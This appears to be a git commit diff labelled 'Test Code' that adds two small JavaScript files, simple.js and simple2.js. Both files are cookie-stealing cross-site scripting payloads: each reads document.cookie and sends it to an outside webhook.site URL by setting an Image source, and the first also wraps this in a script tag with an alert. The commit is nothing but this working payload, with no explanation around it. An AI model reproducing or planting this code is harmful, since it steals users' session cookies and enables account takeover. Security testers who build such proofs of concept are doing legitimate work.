ceb5715173f17d56f5a341fefeb33a01e8a04665
Rajagopal Iyer <crmiyer@gmail.com>
2024-02-23 23:59:28 +0800

    Test Code

---
+++ simple.js
@@ -0,0 +1,5 @@
+<script>
+alert(document.cookie);
+var i=new Image;
+i.src="https://webhook.site/a0fd2b81-6b80-4755-b536-f558b1508f1c/?"+document.cookie;
+</script>
---
+++ simple2.js
@@ -0,0 +1,3 @@
+console.log("HEHEHEH")
+var i=new Image;
+i.src="https://webhook.site/a0fd2b81-6b80-4755-b536-f558b1508f1c?"+document.cookie;
